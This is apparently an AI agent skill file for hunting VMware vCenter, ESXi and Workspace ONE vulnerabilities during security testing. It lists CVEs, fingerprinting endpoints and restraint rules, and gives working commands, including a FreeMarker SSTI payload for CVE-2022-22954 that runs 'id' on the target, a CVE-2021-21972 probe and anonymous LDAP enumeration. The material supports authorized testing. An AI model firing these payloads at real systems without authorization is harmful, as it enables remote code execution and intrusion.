---
name: hunt-vcenter
description: VMware vCenter / ESXi hunting — the 2026 trifecta (CVE-2021-21972, CVE-2021-21985, CVE-2022-22954 FreeMarker SSTI), DCE/RPC OOB (CVE-2023-34048), ESX Admins group bypass (CVE-2024-37085), OpenSLP, SSO/vmdir/LDAP anonymous bind, MOB disclosure, host-header auth bypass, canary technique for SSTI/RCE confirmation, no-spray discipline. Use when vCenter/ESXi/vrops/Workspace ONE endpoints detected. Trigger keywords: vCenter, ESXi, VMware, CVE-2021-21972, vrops, Workspace ONE, vmdir.
---

# VMware vCenter / ESXi — Deep Hunting

## THE GATE
The trifecta that still pays in 2026 (slow vendor patching): CVE-2021-21972 (`/ui/vropspluginui/rest/services/uploadova` — 405 = vulnerable, 404/401 = patched), CVE-2021-21985 (vSAN Health Check ProxygenController reflection→RCE, enabled by default), CVE-2022-22954 (Workspace ONE `/catalog-portal/ui/oauth/verify?deviceUdid=${...}` FreeMarker SSTI, `freemarker.template.utility.Execution`).

## More CVEs
CVE-2023-34048 DCE/RPC OOB write (vmdir/vmafd), APT-exploited ~1.5yr zero-day; CVE-2024-37085 ESXi `ESX Admins` AD-group auto-admin bypass (ransomware-favorite); ESXi OpenSLP port 427 CVE-2020-3992/21974.

## Canary Technique for SSTI/RCE Confirmation
Emit unique random canary + `id`, require exact canary echoed back AND output absent from a baseline capture — prevents WAF/coincidental error pages being misread as RCE.

## SSO / vmdir
`/websso/SAML2/Metadata/vsphere.local`, anonymous LDAP bind to 389/636; `/mob` Managed Object Browser 200 = unauthenticated topology disclosure; `/sdk/vimServiceVersions.xml` reveals exact build. CVE-2022-22972 Host-header auth bypass.

## Do NOT Spray
`administrator@vsphere.local` — lockout threshold often 3 attempts/60s.

## Key Commands
```
curl -sk -o /dev/null -w "%{http_code}" https://T/ui/vropspluginui/rest/services/uploadova
curl -sk "https://T/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
ldapsearch -x -H "ldap://T:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=vsphere,dc=local"
POST /api/session → vmware-api-session-id → /api/vcenter/vm
```

## Fingerprinting
TLS cert SAN (vcenter/vsphere/vcsa/psc/vmware); `/ui`, `/websso/SAML2/Metadata`, `/sdk`, `/mob`; Workspace ONE `/SAAS`; Aria `/vco`, `/lcm/api/v1`.

## Validation
Version map to advisory; detection-only probes first (405/404/401 for 21972; Stage A baseline then Stage B canary for 22954). Never execute upload PoCs without sign-off.

## Common Mistakes
Spraying vCenter SSO; executing file-upload PoCs without explicit OK; confusing internet-exposed ESXi with vCenter (OpenSLP is port 427); current-patch internet vCenter = more than Informational only if unpatched (then Critical).